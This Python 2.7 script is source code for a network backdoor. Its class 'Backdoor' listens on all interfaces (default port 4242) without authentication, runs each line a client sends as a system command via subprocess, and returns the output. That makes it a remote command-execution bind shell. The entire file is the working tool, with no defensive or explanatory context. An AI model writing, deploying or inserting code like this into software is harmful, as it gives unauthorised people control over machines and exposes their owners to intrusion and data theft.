#!/usr/bin/env python

# developed for python 2.7

import sys
import socket
import argparse
import subprocess
from threading import Thread


class Server:

    def __init__(self, backlog=5):
        self.backlog = backlog
        self.servsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.servsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.should_stop = True
        self.threads = []

    def run(self, port):
        self.servsocket.bind(("", port))        # bind on all interfaces
        self.servsocket.listen(self.backlog)
        self.should_stop = False

        while not self.should_stop:
            clientsocket, clientaddress = self.servsocket.accept()
            self.threads.append(Thread(target=self.handle_client,
                                       args=(clientsocket, clientaddress)))
            self.threads[-1].start()

        for thread in self.threads:
            thread.join()

    def handle_client(self, socket, address):
        pass


class Backdoor(Server):
    # TODO handle ctrl-c, ctrl-d
    def handle_client(self, socket, address):
        f = socket.makefile()
        while not self.should_stop:
            raw_line = f.readline()
            if len(raw_line) > 0 and raw_line[-1] == '\n':
                raw_line = raw_line[:-1]
            out = subprocess.check_output(raw_line)
            socket.send(out)


def main():
    parser = argparse.ArgumentParser(description="zobb")
    parser.add_argument("-p", "--port", type=int, action="store", default=4242)
    parser.add_argument("--backlog", type=int, action="store", default=5)
    args = parser.parse_args(sys.argv[1:])

    backdoor = Backdoor(backlog=args.backlog)
    backdoor.run(args.port)


if __name__ == "__main__":
    main()
